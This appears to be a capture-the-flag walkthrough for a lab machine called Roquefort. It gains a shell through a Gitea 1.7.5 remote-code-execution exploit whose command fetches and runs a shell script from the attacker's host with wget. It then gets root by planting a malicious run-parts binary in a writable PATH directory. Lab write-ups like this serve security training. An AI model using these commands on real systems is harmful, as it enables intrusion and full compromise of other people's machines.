# Roquefort

## Gaining Access

Nmap scan:

```
$ nmap -p- --min-rate 3000 -Pn 192.168.157.67 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-16 10:40 +08
Nmap scan report for 192.168.157.67
Host is up (0.17s latency).
Not shown: 65530 filtered tcp ports (no-response)
PORT     STATE  SERVICE
21/tcp   open   ftp
22/tcp   open   ssh
2222/tcp open   EtherNetIP-1
3000/tcp open   ppp
```

FTP does not allow for anonymous logins.

### Web Enum --> Gitea RCE

Only port 3000 has a webpage:

<figure><img src="../../../.gitbook/assets/image (504).png" alt=""><figcaption></figcaption></figure>

In the bottom left, we can see the version, which is vulnerable to RCE:

```
$ searchsploit gitea 1.7.5
----------------------------------------------------------- ---------------------------------
 Exploit Title                                             |  Path
----------------------------------------------------------- ---------------------------------
Gitea 1.7.5 - Remote Code Execution                        | multiple/webapps/49383.py
----------------------------------------------------------- ---------------------------------
```

We can create any account, and then use these settings:

```
USERNAME = "test123"
PASSWORD = "test123"
HOST_ADDR = '192.168.45.196'
HOST_PORT = 3000
URL = 'http://192.168.157.67:3000'
CMD = 'wget http://192.168.45.196:21/shell.sh && bash shell.sh'
```

We would then get a reverse shell:

<figure><img src="../../../.gitbook/assets/image (1547).png" alt=""><figcaption></figcaption></figure>

## Privilege Escalation

### Cronjob Path --> Root

`linpeas.sh` picked up that we can write to the Systemd PATH:

<figure><img src="../../../.gitbook/assets/image (490).png" alt=""><figcaption></figcaption></figure>

This means we just need to find some process from `root` that doesn't use the full PATH. I used `pspy64` to find such a process.

```
2023/07/15 22:55:01 CMD: UID=0    PID=13493  | run-parts --report /etc/cron.hourly 
```

`run-parts` should work.&#x20;

```
chloe@roquefort:/tmp$ which run-parts
/bin/run-parts
```

Since the `/bin` directory is the last in PATH, we can place our malicious binary within `/usr/local/bin` to be executed first.&#x20;

```bash
cd /usr/local/bin
wget 192.168.45.196:21/run-parts
chmod 777 run-parts
```

Then, start a listener port and wait for `root` to execute the binary:

<figure><img src="../../../.gitbook/assets/image (3443).png" alt=""><figcaption></figcaption></figure>
